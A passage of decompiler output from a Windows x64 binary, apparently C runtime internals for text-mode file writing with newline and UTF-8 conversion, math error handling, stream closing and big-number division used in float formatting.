    {
      v22 = 13;
      if ( !(unsigned int)MEMORY[0x76F91F30](v25, &v22, 1i64, &v23, 0i64) )
        goto LABEL_20;
      if ( !v23 )
        return a1;
      ++*(_DWORD *)(a1 + 8);
      ++*(_DWORD *)(a1 + 4);
    }
  }
  return a1;
}
// 13F173E06: variable 'v19' is possibly undefined
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];
// 13F173C30: using guessed type char var_18[8];

//----- (000000013F173E38) ----------------------------------------------------
_DWORD *__fastcall sub_13F173E38(_DWORD *a1, int a2, char *a3, int a4)
{
  char *v5; // rbp
  char *v6; // rsi
  __int64 v7; // rax
  __int64 v8; // r14
  char *v9; // rdi
  char v10; // al
  unsigned int v11; // edi
  unsigned int v12; // eax
  int v14[4]; // [rsp+30h] [rbp-1438h] BYREF
  char v15[5119]; // [rsp+40h] [rbp-1428h] BYREF
  char v16; // [rsp+143Fh] [rbp-29h] BYREF

  v5 = &a3[a4];
  *a1 = 0;
  v6 = a3;
  a1[1] = 0;
  v7 = qword_13F1C6400[(__int64)a2 >> 6];
  a1[2] = 0;
  v8 = *(_QWORD *)(v7 + ((unsigned __int64)(a2 & 0x3F) << 6) + 40);
  if ( a3 < v5 )
  {
    while ( 1 )
    {
      v9 = v15;
      do
      {
        if ( v6 >= v5 )
          break;
        v10 = *v6++;
        if ( v10 == 10 )
        {
          ++a1[2];
          *v9++ = 13;
        }
        *v9++ = v10;
      }
      while ( v9 < &v16 );
      v11 = (_DWORD)v9 - (unsigned int)v15;
      if ( !(unsigned int)MEMORY[0x76F91F30](v8, v15, v11, v14, 0i64) )
        break;
      v12 = v14[0];
      a1[1] += v14[0];
      if ( v12 < v11 || v6 >= v5 )
        return a1;
    }
    *a1 = MEMORY[0x76F91760]();
  }
  return a1;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];
// 13F173E38: using guessed type unsigned int var_1438[4];

//----- (000000013F173F40) ----------------------------------------------------
_DWORD *__fastcall sub_13F173F40(_DWORD *a1, int a2, __int16 *a3, unsigned int a4)
{
  __int16 *v5; // rbp
  __int16 *v6; // rsi
  __int64 v7; // rax
  __int64 v8; // r14
  char *v9; // rbx
  __int16 v10; // ax
  unsigned int v11; // ebx
  unsigned int v12; // eax
  int v14[4]; // [rsp+30h] [rbp-1438h] BYREF
  char v15[5118]; // [rsp+40h] [rbp-1428h] BYREF
  char v16; // [rsp+143Eh] [rbp-2Ah] BYREF

  v5 = (__int16 *)((char *)a3 + a4);
  *a1 = 0;
  v6 = a3;
  a1[1] = 0;
  v7 = qword_13F1C6400[(__int64)a2 >> 6];
  a1[2] = 0;
  v8 = *(_QWORD *)(v7 + ((unsigned __int64)(a2 & 0x3F) << 6) + 40);
  if ( a3 < v5 )
  {
    while ( 1 )
    {
      v9 = v15;
      do
      {
        if ( v6 >= v5 )
          break;
        v10 = *v6++;
        if ( v10 == 10 )
        {
          a1[2] += 2;
          *(_WORD *)v9 = 13;
          v9 += 2;
        }
        *(_WORD *)v9 = v10;
        v9 += 2;
      }
      while ( v9 < &v16 );
      v11 = 2 * ((v9 - v15) >> 1);
      if ( !(unsigned int)MEMORY[0x76F91F30](v8, v15, v11, v14, 0i64) )
        break;
      v12 = v14[0];
      a1[1] += v14[0];
      if ( v12 < v11 || v6 >= v5 )
        return a1;
    }
    *a1 = MEMORY[0x76F91760]();
  }
  return a1;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];
// 13F173F40: using guessed type unsigned int var_1438[4];

//----- (000000013F17405C) ----------------------------------------------------
__int64 __fastcall sub_13F17405C(__int64 a1, int a2, __int16 *a3, unsigned int a4)
{
  __int16 *v5; // r14
  int v6; // er15
  __int16 *v7; // rdi
  __int64 v8; // r12
  bool v9; // cf
  char *v10; // rax
  __int16 v11; // cx
  unsigned int v12; // ebp
  unsigned int v13; // esi
  int v15[4]; // [rsp+40h] [rbp-1458h] BYREF
  char v16[1704]; // [rsp+50h] [rbp-1448h] BYREF
  char v17; // [rsp+6F8h] [rbp-DA0h] BYREF
  char v18[3424]; // [rsp+700h] [rbp-D98h] BYREF

  v5 = (__int16 *)((char *)a3 + a4);
  v6 = (int)a3;
  v7 = a3;
  v8 = *(_QWORD *)(qword_13F1C6400[(__int64)a2 >> 6] + ((unsigned __int64)(a2 & 0x3F) << 6) + 40);
  *(_DWORD *)a1 = 0;
  *(_QWORD *)(a1 + 4) = 0i64;
  v9 = a3 < v5;
LABEL_2:
  if ( v9 )
  {
    v10 = v16;
    do
    {
      if ( v7 >= v5 )
        break;
      v11 = *v7++;
      if ( v11 == 10 )
      {
        *(_WORD *)v10 = 13;
        v10 += 2;
      }
      *(_WORD *)v10 = v11;
      v10 += 2;
    }
    while ( v10 < &v17 );
    v12 = MEMORY[0x76F91F80](65001i64, 0i64, v16, (unsigned int)((v10 - v16) >> 1), v18, 3413, 0i64, 0i64);
    if ( v12 )
    {
      v13 = 0;
      while ( (unsigned int)MEMORY[0x76F91F30](v8, &v18[v13], v12 - v13, v15, 0i64) )
      {
        v13 += v15[0];
        if ( v13 >= v12 )
        {
          *(_DWORD *)(a1 + 4) = (_DWORD)v7 - v6;
          v9 = v7 < v5;
          goto LABEL_2;
        }
      }
    }
    *(_DWORD *)a1 = MEMORY[0x76F91760]();
  }
  return a1;
}
// 13F174152: conditional instruction was optimized away because eax.4!=0
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];
// 13F17405C: using guessed type int var_1458[4];

//----- (000000013F1741D0) ----------------------------------------------------
__int64 __fastcall sub_13F1741D0(int a1, __int16 *a2, unsigned int a3)
{
  __int64 v6; // r14
  unsigned __int64 v7; // rsi
  unsigned int v8; // edi

  if ( a1 == -2 )
  {
    *sub_13F169D8C() = 0;
    *(_DWORD *)sub_13F169DAC() = 9;
    return 0xFFFFFFFFi64;
  }
  if ( a1 < 0
    || (unsigned int)a1 >= 0x40
    || (v6 = (__int64)a1 >> 6,
        v7 = (unsigned __int64)(a1 & 0x3F) << 6,
        (*(_BYTE *)(qword_13F1C6400[v6] + v7 + 56) & 1) == 0) )
  {
    *sub_13F169D8C() = 0;
    *(_DWORD *)sub_13F169DAC() = 9;
    sub_13F1682A0();
    return 0xFFFFFFFFi64;
  }
  sub_13F1730FC();
  v8 = -1;
  if ( (*(_BYTE *)(qword_13F1C6400[v6] + v7 + 56) & 1) != 0 )
  {
    v8 = sub_13F1742BC(a1, a2, a3);
  }
  else
  {
    *(_DWORD *)sub_13F169DAC() = 9;
    *sub_13F169D8C() = 0;
  }
  sub_13F173120();
  return v8;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F1742BC) ----------------------------------------------------
__int64 __fastcall sub_13F1742BC(int a1, __int16 *a2, unsigned int a3)
{
  int v3; // edi
  __int64 v4; // r15
  __int64 v8; // r13
  unsigned __int64 v9; // r14
  __int64 v10; // rcx
  char v11; // bl
  unsigned __int16 *v12; // r12
  int v13; // ebx
  unsigned __int16 *v14; // r15
  unsigned __int16 v15; // r13
  __int64 v16; // rax
  __int64 v17; // xmm0_8
  __int64 v18; // rcx
  __int64 v19; // rcx
  __int64 v20[2]; // [rsp+30h] [rbp-30h] BYREF
  __int64 v21; // [rsp+40h] [rbp-20h]
  __int64 v22; // [rsp+50h] [rbp-10h]
  char v23[8]; // [rsp+58h] [rbp-8h] BYREF

  v3 = 0;
  v4 = a3;
  if ( !a3 )
    return 0i64;
  if ( !a2
    || (v8 = (__int64)a1 >> 6,
        v9 = (unsigned __int64)(a1 & 0x3F) << 6,
        v22 = v8,
        v10 = qword_13F1C6400[v8],
        v11 = *(_BYTE *)(v10 + v9 + 57),
        (unsigned __int8)(v11 - 1) <= 1u)
    && (a3 & 1) != 0 )
  {
    *sub_13F169D8C() = 0;
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 0xFFFFFFFFi64;
  }
  if ( (*(_BYTE *)(v10 + v9 + 56) & 0x20) != 0 )
    sub_13F176EA8((unsigned int)a1, 0i64, 2i64);
  v21 = 0i64;
  if ( (unsigned int)sub_13F176554(a1)
    && *(char *)(qword_13F1C6400[v8] + v9 + 56) < 0
    && (*(_QWORD *)(*(_QWORD *)(sub_13F16E528() + 144) + 312i64) || *(_BYTE *)(qword_13F1C6400[v8] + v9 + 57))
    && (unsigned int)MEMORY[0x76F917F0](*(_QWORD *)(qword_13F1C6400[v8] + v9 + 40), v23) )
  {
    if ( v11 )
    {
      if ( (unsigned __int8)(v11 - 1) > 1u )
        goto LABEL_40;
      v20[0] = 0i64;
      v12 = (unsigned __int16 *)((char *)a2 + v4);
      v13 = 0;
      v14 = (unsigned __int16 *)a2;
      if ( a2 < (__int16 *)v12 )
      {
        while ( 1 )
        {
          v15 = *v14;
          if ( (unsigned __int16)sub_13F176EB0(*v14) != v15 )
            break;
          v13 += 2;
          HIDWORD(v20[0]) = v13;
          if ( v15 == 10 )
          {
            if ( (unsigned __int16)sub_13F176EB0(0xDu) != 13 )
              break;
            HIDWORD(v20[0]) = ++v13;
            ++v3;
          }
          if ( ++v14 >= v12 )
            goto LABEL_25;
        }
        LODWORD(v20[0]) = MEMORY[0x76F91760]();
LABEL_25:
        v8 = v22;
      }
      goto LABEL_38;
    }
    v16 = sub_13F173C30((__int64)v20, a1, (unsigned __int64)a2, v4);
  }
  else
  {
    v18 = qword_13F1C6400[v8];
    if ( *(char *)(v18 + v9 + 56) >= 0 )
    {
      v19 = *(_QWORD *)(v18 + v9 + 40);
      memset(v20, 0, 12);
      if ( !(unsigned int)MEMORY[0x76F91F30](v19, a2, (unsigned int)v4, (char *)v20 + 4, 0i64) )
        LODWORD(v20[0]) = MEMORY[0x76F91760]();
      v3 = v20[1];
LABEL_38:
      v17 = v20[0];
      goto LABEL_39;
    }
    if ( v11 )
    {
      if ( v11 == 1 )
      {
        v16 = sub_13F17405C((__int64)v20, a1, a2, v4);
      }
      else
      {
        if ( v11 != 2 )
          goto LABEL_40;
        v16 = (__int64)sub_13F173F40(v20, a1, a2, v4);
      }
    }
    else
    {
      v16 = (__int64)sub_13F173E38(v20, a1, (char *)a2, v4);
    }
  }
  v17 = *(_QWORD *)v16;
  v3 = *(_DWORD *)(v16 + 8);
LABEL_39:
  v21 = v17;
LABEL_40:
  if ( !HIDWORD(v21) )
  {
    if ( (_DWORD)v21 )
    {
      if ( (_DWORD)v21 == 5 )
      {
        *(_DWORD *)sub_13F169DAC() = 9;
        *sub_13F169D8C() = 5;
      }
      else
      {
        sub_13F169D3C(v21);
      }
    }
    else
    {
      if ( (*(_BYTE *)(qword_13F1C6400[v8] + v9 + 56) & 0x40) != 0 && *(_BYTE *)a2 == 26 )
        return 0i64;
      *(_DWORD *)sub_13F169DAC() = 28;
      *sub_13F169D8C() = 0;
    }
    return 0xFFFFFFFFi64;
  }
  return (unsigned int)(HIDWORD(v21) - v3);
}
// 13F176EA8: using guessed type __int64 __fastcall sub_13F176EA8(_QWORD, _QWORD, _QWORD);
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];
// 13F1742BC: using guessed type char var_8[8];

//----- (000000013F1745A0) ----------------------------------------------------
// local variable allocation has failed, the output may be wrong!
__m128 __fastcall sub_13F1745A0(double a1, double a2, int a3)
{
  int v3; // er8
  int v4; // er9
  char v6; // [rsp+20h] [rbp-48h]
  double v7; // [rsp+30h] [rbp-38h]

  v3 = a3 - 2;
  if ( !v3 )
  {
    v4 = 4;
    v7 = a1;
    v6 = 18;
    goto LABEL_5;
  }
  if ( v3 == 1 )
  {
    v4 = 3;
    v7 = a1;
    v6 = 17;
LABEL_5:
    sub_13F17475C((__int64)"exp", 20, *(__int64 *)&a2, v4, v6, 0x22u, v7, 0i64, 1);
  }
  return *(__m128 *)&a2;
}
// 13F1745A0: inconsistent variable size for 'xmm1_8.8'

//----- (000000013F174638) ----------------------------------------------------
double __fastcall sub_13F174638(int a1, __int64 a2, __int64 a3, double a4, __int64 a5, double a6, __int64 a7)
{
  int v9; // [rsp+20h] [rbp-38h] BYREF
  __int64 v10; // [rsp+28h] [rbp-30h]
  double v11; // [rsp+30h] [rbp-28h]
  __int64 v12; // [rsp+38h] [rbp-20h]
  double v13; // [rsp+40h] [rbp-18h]

  v9 = a1;
  v12 = a5;
  v13 = a6;
  v11 = a4;
  v10 = a3;
  sub_13F170A64(a7, 65472);
  if ( !(unsigned int)sub_13F16D154((__int64)&v9) )
    sub_13F170A14(a1);
  return v13;
}

//----- (000000013F1746A0) ----------------------------------------------------
_BOOL8 __fastcall sub_13F1746A0(char a1, __int16 a2)
{
  int v3; // ebx

  v3 = a1 & 0x1F;
  if ( (a1 & 8) != 0 && (a2 & 0x80u) != 0 )
  {
    sub_13F170AE0(1);
    v3 &= ~8u;
  }
  else if ( (a1 & 4) != 0 && (a2 & 0x200) != 0 )
  {
    sub_13F170AE0(4);
    v3 &= ~4u;
  }
  else if ( (a1 & 1) != 0 && (a2 & 0x400) != 0 )
  {
    sub_13F170AE0(8);
    v3 &= ~1u;
  }
  else if ( (a1 & 2) != 0 && (a2 & 0x800) != 0 )
  {
    if ( (a1 & 0x10) != 0 )
      sub_13F170AE0(16);
    v3 &= ~2u;
  }
  if ( (a1 & 0x10) != 0 && (a2 & 0x1000) != 0 )
  {
    sub_13F170AE0(32);
    v3 &= ~0x10u;
  }
  return v3 == 0;
}

//----- (000000013F17475C) ----------------------------------------------------
double __fastcall sub_13F17475C(
        __int64 a1,
        __int16 a2,
        __int64 a3,
        int a4,
        char a5,
        unsigned int a6,
        double a7,
        __int64 a8,
        int a9)
{
  BOOL v13; // eax
  __int64 v14; // xmm6_8
  __int64 v16; // [rsp+48h] [rbp-A1h] BYREF
  double v17[2]; // [rsp+50h] [rbp-99h] BYREF
  int v18[12]; // [rsp+68h] [rbp-81h] BYREF
  __int64 v19; // [rsp+98h] [rbp-51h]
  unsigned int v20; // [rsp+A8h] [rbp-41h]

  v16 = sub_13F170A64(8064, 65472);
  *(_QWORD *)&v17[1] = a3;
  *(_QWORD *)&v17[0] = a3;
  v13 = sub_13F1746A0(a5, v16);
  v14 = a8;
  if ( !v13 )
  {
    if ( a9 == 2 )
    {
      v19 = a8;
      v20 = v20 & 0xFFFFFFE0 | 3;
    }
    sub_13F1706B8(v18, &v16, a5, a2, &a7, v17);
  }
  if ( sub_13F16D12C() && a4 )
    return sub_13F174638(a4, a6, a1, a7, v14, v17[0], v16);
  sub_13F170A14(a4);
  sub_13F170A64(v16, 65472);
  return v17[0];
}
// 13F17475C: using guessed type double var_C8[2];
// 13F17475C: using guessed type int anonymous_0[12];

//----- (000000013F174884) ----------------------------------------------------
float __fastcall sub_13F174884(
        __int64 a1,
        __int16 a2,
        int a3,
        int a4,
        char a5,
        unsigned int a6,
        float a7,
        float a8,
        int a9)
{
  BOOL v13; // eax
  float v14; // xmm6_4
  __int64 v16; // [rsp+48h] [rbp-A1h] BYREF
  __int64 v17; // [rsp+50h] [rbp-99h] BYREF
  int v18; // [rsp+58h] [rbp-91h]
  _DWORD v19[16]; // [rsp+68h] [rbp-81h] BYREF
  unsigned int v20; // [rsp+A8h] [rbp-41h]

  v17 = sub_13F170A64(8064, 65472);
  v18 = a3;
  LODWORD(v16) = a3;
  v13 = sub_13F1746A0(a5, v17);
  v14 = a8;
  if ( !v13 )
  {
    if ( a9 == 2 )
    {
      *(float *)&v19[12] = a8;
      v20 = v20 & 0xFFFFFFE0 | 1;
    }
    sub_13F1709E8(v19, &v17, a5, a2, &a7, &v16);
  }
  if ( sub_13F16D12C() && a4 )
    return sub_13F174638(a4, a6, a1, a7, COERCE__INT64(v14), *(float *)&v16, v17);
  sub_13F170A14(a4);
  sub_13F170A64(v17, 65472);
  return *(float *)&v16;
}

//----- (000000013F1749B8) ----------------------------------------------------
double __fastcall sub_13F1749B8(__int64 a1)
{
  double result; // xmm0_8

  *(_QWORD *)&result = a1 | 0x8000000000000i64;
  return result;
}

//----- (000000013F1749D4) ----------------------------------------------------
float __fastcall sub_13F1749D4(int a1)
{
  float result; // xmm0_4

  LODWORD(result) = a1 | 0x400000;
  return result;
}

//----- (000000013F1749E4) ----------------------------------------------------
__int64 __fastcall sub_13F1749E4(__int64 a1)
{
  int v1; // er10
  int v3; // er11
  __int64 v4; // rbx
  __int64 v5; // r8
  unsigned __int16 *v6; // r9
  __int64 v7; // rdi
  unsigned __int16 v8; // dx
  unsigned __int16 v9; // cx
  int v10; // ecx

  v1 = 0;
  v3 = 227;
  while ( 1 )
  {
    v4 = 85i64;
    v5 = (v3 + v1) / 2;
    v6 = (unsigned __int16 *)qword_13F193F40[2 * v5];
    v7 = a1 - (_QWORD)v6;
    do
    {
      v8 = *(unsigned __int16 *)((char *)v6 + v7);
      if ( (unsigned __int16)(v8 - 65) <= 0x19u )
        v8 += 32;
      v9 = *v6;
      if ( (unsigned __int16)(*v6 - 65) <= 0x19u )
        v9 += 32;
      ++v6;
      --v4;
    }
    while ( v4 && v8 && v8 == v9 );
    v10 = v8 - v9;
    if ( !v10 )
      break;
    if ( v10 >= 0 )
      v1 = v5 + 1;
    else
      v3 = v5 - 1;
    if ( v1 > v3 )
      return 0xFFFFFFFFi64;
  }
  return LODWORD(qword_13F193F40[2 * v5 + 1]);
}
// 13F193F40: using guessed type __int64 qword_13F193F40[8];

//----- (000000013F174AAC) ----------------------------------------------------
__int64 __fastcall sub_13F174AAC(__int64 a1)
{
  int v1; // eax

  if ( a1 && (v1 = sub_13F1749E4(a1), v1 >= 0) && (unsigned __int64)v1 < 0xE4 )
    return LODWORD(qword_13F1924E0[2 * v1]);
  else
    return 0i64;
}
// 13F1924E0: using guessed type __int64 qword_13F1924E0[512];

//----- (000000013F174AE0) ----------------------------------------------------
__int64 __fastcall sub_13F174AE0(__int64 a1)
{
  unsigned int v3; // edi
  int v4; // eax
  __int64 v5; // rcx

  if ( a1 )
  {
    v3 = -1;
    if ( (*(_DWORD *)(a1 + 20) & 0x2000) != 0 )
    {
      v3 = sub_13F16D6CC(a1);
      sub_13F16EF54(a1);
      v4 = sub_13F1705A0(a1);
      if ( (int)sub_13F176F80(v4) >= 0 )
      {
        v5 = *(_QWORD *)(a1 + 40);
        if ( v5 )
        {
          sub_13F16E734(v5);
          *(_QWORD *)(a1 + 40) = 0i64;
        }
      }
      else
      {
        v3 = -1;
      }
    }
    sub_13F1770E0(a1);
    return v3;
  }
  else
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 0xFFFFFFFFi64;
  }
}

//----- (000000013F174B64) ----------------------------------------------------
__int64 __fastcall sub_13F174B64(__int64 a1)
{
  unsigned int v3; // edi

  if ( !a1 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 0xFFFFFFFFi64;
  }
  if ( (*(_DWORD *)(a1 + 20) & 0x1000) != 0 )
  {
    sub_13F1770E0(a1);
    return 0xFFFFFFFFi64;
  }
  sub_13F16807C();
  v3 = sub_13F174AE0(a1);
  sub_13F168088();
  return v3;
}

//----- (000000013F174BD0) ----------------------------------------------------
__int64 __fastcall sub_13F174BD0(__int64 a1, unsigned __int64 a2, int a3, __int64 a4)
{
  char *v4; // rax
  unsigned int v5; // ebx
  int v7; // eax
  char *v8; // rdx
  char *v9; // rax
  char v10; // r10
  __int64 v11; // r8

  if ( !a1 || !a2 )
    goto LABEL_2;
  *(_BYTE *)a1 = 0;
  v7 = 0;
  if ( a3 > 0 )
    v7 = a3;
  if ( a2 <= v7 + 1 )
  {
    v4 = sub_13F169DAC();
    v5 = 34;
    goto LABEL_3;
  }
  if ( !a4 )
  {
LABEL_2:
    v4 = sub_13F169DAC();
    v5 = 22;
LABEL_3:
    *(_DWORD *)v4 = v5;
    sub_13F1682A0();
    return v5;
  }
  v8 = *(char **)(a4 + 8);
  v9 = (char *)(a1 + 1);
  *(_BYTE *)a1 = 48;
  while ( a3 > 0 )
  {
    v10 = *v8;
    if ( *v8 )
      ++v8;
    else
      v10 = 48;
    *v9++ = v10;
    --a3;
  }
  *v9 = 0;
  if ( a3 >= 0 && *v8 >= 53 )
  {
    while ( *--v9 == 57 )
      *v9 = 48;
    ++*v9;
  }
  if ( *(_BYTE *)a1 == 49 )
  {
    ++*(_DWORD *)(a4 + 4);
  }
  else
  {
    v11 = -1i64;
    do
      ++v11;
    while ( *(_BYTE *)(a1 + v11 + 1) );
    sub_13F15EB00((__m128i *)a1, (const __m128i *)(a1 + 1), v11 + 1);
  }
  return 0i64;
}

//----- (000000013F174C90) ----------------------------------------------------
__int64 __fastcall sub_13F174C90(__int64 a1, _DWORD *a2)
{
  __int64 result; // rax
  __int64 v5; // r9
  unsigned int v6; // eax
  unsigned __int64 v7; // r15
  int v8; // er14
  unsigned int v9; // ebx
  unsigned int v10; // ebx
  __int64 v11; // rdi
  unsigned __int64 v12; // rbp
  __int64 v13; // rax
  unsigned __int64 v14; // rtt
  __int64 v15; // rdx
  int v16; // er8
  unsigned int v17; // er13
  int v18; // er10
  char *v19; // r11
  _DWORD *v20; // rcx
  unsigned int v21; // er10
  unsigned int v22; // ebx
  bool v23; // zf
  int v24; // edx
  char v25; // r11
  unsigned int v26; // er10
  unsigned int v27; // ebx
  int v28; // ebx
  __int64 v29; // r15
  __int64 v30; // rdi
  unsigned __int64 v31; // r11
  unsigned int v32; // ebp
  unsigned int v33; // er10
  unsigned __int64 v34; // r8
  unsigned __int64 v35; // rax
  unsigned __int64 v36; // rcx
  __int64 v37; // r8
  unsigned __int64 v38; // rdx
  unsigned __int64 v39; // rcx
  unsigned int v40; // edx
  unsigned int *v41; // r9
  __int64 v42; // rbx
  unsigned __int64 v43; // rcx
  unsigned int v44; // er10
  __int64 v45; // r11
  unsigned int v46; // eax
  unsigned __int64 v47; // r9
  unsigned int v48; // er10
  _DWORD *v49; // r11
  __int64 v50; // rbx
  __int64 v51; // rdx
  __int64 v52; // rcx
  unsigned __int64 v53; // rdx
  unsigned int v54; // er9
  unsigned int i; // ecx
  __int64 v56; // rax
  __int64 v57; // rdx
  char v58; // [rsp+20h] [rbp-238h]
  unsigned __int64 v59; // [rsp+28h] [rbp-230h]
  unsigned __int64 v60; // [rsp+30h] [rbp-228h]
  char v61; // [rsp+38h] [rbp-220h]
  __m128i v62[29]; // [rsp+44h] [rbp-214h] BYREF
  int v63; // [rsp+260h] [rbp+8h]
  int v65; // [rsp+270h] [rbp+18h]
  unsigned int v66; // [rsp+278h] [rbp+20h]

  if ( !*(_DWORD *)a1 || !*a2 )
    return 0i64;
  v5 = (unsigned int)(*(_DWORD *)a1 - 1);
  v6 = *a2 - 1;
  if ( *a2 == 1 )
  {
    v7 = (unsigned int)a2[1];
    v8 = 0;
    if ( (_DWORD)v7 == 1 )
    {
      v9 = *(_DWORD *)(a1 + 4);
      *(_DWORD *)a1 = 0;
      sub_13F1764CC((__m128i *)(a1 + 4), 0x1CCui64, v62, 0i64);
      return v9;
    }
    else if ( *(_DWORD *)a1 == 1 )
    {
      v10 = *(_DWORD *)(a1 + 4);
      *(_DWORD *)a1 = 0;
      sub_13F1764CC((__m128i *)(a1 + 4), 0x1CCui64, v62, 0i64);
      result = v10 / (unsigned int)v7;
      *(_DWORD *)(a1 + 4) = v10 % (unsigned int)v7;
      LOBYTE(v8) = v10 % (unsigned int)v7 != 0;
      *(_DWORD *)a1 = v8;
    }
    else
    {
      v11 = 0i64;
      v12 = 0i64;
      if ( *(_DWORD *)a1 )
      {
        do
        {
          v13 = *(unsigned int *)(a1 + 4 * v5 + 4);
          v5 = (unsigned int)(v5 - 1);
          v14 = (v12 << 32) | v13;
          v12 = v14 % v7;
          v11 = (unsigned int)(v14 / v7) + (v11 << 32);
        }
        while ( (_DWORD)v5 != -1 );
      }
      *(_DWORD *)a1 = 0;
      sub_13F1764CC((__m128i *)(a1 + 4), 0x1CCui64, v62, 0i64);
      *(_QWORD *)(a1 + 4) = v12;
      result = v11;
      LOBYTE(v8) = HIDWORD(v12) != 0;
      *(_DWORD *)a1 = v8 + 1;
    }
  }
  else if ( v6 <= (unsigned int)v5 )
  {
    v15 = (int)v5;
    v16 = v5 - v6;
    v17 = v6 + 1;
    v18 = *(_DWORD *)a1 - 1;
    if ( (int)v5 < (__int64)(int)(v5 - v6) )
      goto LABEL_20;
    v19 = (char *)a2 - a1 + -4 * v16;
    v20 = (_DWORD *)(a1 + 4 + 4i64 * (int)v5);
    while ( *(_DWORD *)((char *)v20 + (_QWORD)v19) == *v20 )
    {
      --v18;
      --v15;
      --v20;
      if ( v15 < v16 )
        goto LABEL_20;
    }
    if ( a2[v18 - (__int64)v16 + 1] < *(_DWORD *)(a1 + 4i64 * v18 + 4) )
LABEL_20:
      ++v16;
    if ( v16 )
    {
      v21 = a2[v6 + 1];
      v22 = a2[v6];
      v23 = !_BitScanReverse(&v6, v21);
      v66 = a2[v17 - 1];
      if ( v23 )
        v24 = 32;
      else
        v24 = 31 - v6;
      v25 = 32 - v24;
      v65 = v24;
      v58 = 32 - v24;
      if ( v24 )
      {
        v26 = v22 >> v25;
        v27 = v22 << v24;
        v21 = (a2[v17] << v24) | v26;
        v66 = v27;
        if ( v17 > 2 )
          v66 = (a2[v17 - 2] >> v25) | v27;
      }
      v28 = v16 - 1;
      v63 = v16 - 1;
      v29 = 0i64;
      if ( v16 - 1 >= 0 )
      {
        v30 = v28 + v17;
        v31 = v21;
        v60 = v21;
        v61 = 32 - v24;
        do
        {
          if ( (unsigned int)v30 > (unsigned int)v5 )
            v32 = 0;
          else
            v32 = *(_DWORD *)(a1 + 4 * v30 + 4);
          v33 = *(_DWORD *)(a1 + 4i64 * (unsigned int)(v30 - 2) + 4);
          LODWORD(v59) = *(_DWORD *)(a1 + 4i64 * (unsigned int)(v30 - 1) + 4);
          HIDWORD(v59) = v32;
          if ( v24 )
          {
            v34 = (v59 << v24) | ((unsigned __int64)v33 >> v61);
            v33 <<= v24;
            if ( (unsigned int)v30 >= 3 )
              v33 |= *(_DWORD *)(a1 + 4i64 * (unsigned int)(v30 - 3) + 4) >> v58;
          }
          else
          {
            v34 = v59;
          }
          v35 = v34 / v31;
          v36 = (unsigned int)(v34 % v31);
          v37 = v35;
          if ( v35 > 0xFFFFFFFF )
          {
            v37 = 0xFFFFFFFFi64;
            v36 += v31 * (v35 - 0xFFFFFFFF);
          }
          if ( v36 <= 0xFFFFFFFF )
          {
            v38 = v37 * v66;
            do
            {
              if ( v38 <= (v33 | (v36 << 32)) )
                break;
              --v37;
              v38 -= v66;
              v36 += v60;
            }
            while ( v36 <= 0xFFFFFFFF );
            v28 = v63;
          }
          if ( v37 )
          {
            v39 = 0i64;
            if ( v17 )
            {
              v40 = v28;
              v41 = a2 + 1;
              v42 = v17;
              do
              {
                v43 = v37 * *v41 + v39;
                v44 = v43;
                v39 = HIDWORD(v43);
                v45 = a1 + 4i64 * v40;
                v46 = *(_DWORD *)(v45 + 4);
                if ( v46 < v44 )
                  ++v39;
                ++v40;
                ++v41;
                *(_DWORD *)(v45 + 4) = v46 - v44;
                --v42;
              }
              while ( v42 );
              v28 = v63;
            }
            if ( v32 < v39 )
            {
              LODWORD(v47) = 0;
              if ( v17 )
              {
                v48 = v28;
                v49 = a2 + 1;
                v50 = v17;
                do
                {
                  ++v49;
                  v51 = *(unsigned int *)(a1 + 4i64 * v48 + 4);
                  v52 = a1 + 4i64 * v48++;
                  v53 = (unsigned int)v47 + (unsigned int)*(v49 - 1) + v51;
                  *(_DWORD *)(v52 + 4) = v53;
                  v47 = HIDWORD(v53);
                  --v50;
                }
                while ( v50 );
              }
              LODWORD(v37) = v37 - 1;
            }
            v28 = v63;
            LODWORD(v5) = v30 - 1;
          }
          v31 = v60;
          --v28;
          v24 = v65;
          v30 = (unsigned int)(v30 - 1);
          v29 = (unsigned int)v37 + (v29 << 32);
          v63 = v28;
        }
        while ( v28 >= 0 );
      }
      v54 = v5 + 1;
      for ( i = v54; i < *(_DWORD *)a1; *(_DWORD *)(a1 + 4 * v56 + 4) = 0 )
        v56 = i++;
      *(_DWORD *)a1 = v54;
      if ( v54 )
      {
        do
        {
          v57 = (unsigned int)(*(_DWORD *)a1 - 1);
          if ( *(_DWORD *)(a1 + 4 * v57 + 4) )
            break;
          *(_DWORD *)a1 = v57;
        }
        while ( (_DWORD)v57 );
      }
      return v29;
    }
    else
    {
      return 0i64;
    }
  }
  else
  {
    return 0i64;
  }
  return result;
}
// 13F174C90: using guessed type __m128i var_214[29];

//----- (000000013F175160) ----------------------------------------------------
__int64 __fastcall sub_13F175160(__int64 a1, int a2, __int64 a3, _BYTE *a4, __int64 a5)
{
  __int64 v8; // rbx
  __int64 v9; // rax
  __int64 result; // rax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  __int64 v15; // xmm0_8
  unsigned __int64 v16; // r8
  unsigned __int64 v17; // r14
  int v18; // ebx
  double v19; // xmm0_8
  unsigned __int64 v20; // r14
  int v21; // er12
  unsigned int v22; // edx
  int v23; // er8
  unsigned int v24; // er11
  unsigned int v25; // er9
  int v26; // ebx
  bool v27; // zf
  int v28; // eax
  int v29; // eax
  unsigned int v30; // edi
  unsigned int v31; // eax
  bool v32; // r15
  char v33; // cl
  unsigned int v34; // er14
  __int64 v35; // r8
  __int64 v36; // rdi
  __int32 v37; // er10
  __int64 v38; // rax
  __int32 v39; // edx
  unsigned int v40; // ecx
  __int64 v41; // rax
  unsigned int v42; // er15
  unsigned int v43; // er11
  unsigned int v44; // er9
  int v45; // ebx
  int v46; // eax
  int v47; // eax
  unsigned int v48; // edi
  unsigned int v49; // eax
  bool v50; // r12
  bool v51; // cl
  __int64 v52; // r8
  __int64 v53; // rdi
  __int32 v54; // er10
  __int64 v55; // rax
  __int32 v56; // edx
  unsigned int v57; // ecx
  __int64 v58; // rax
  int v59; // er8
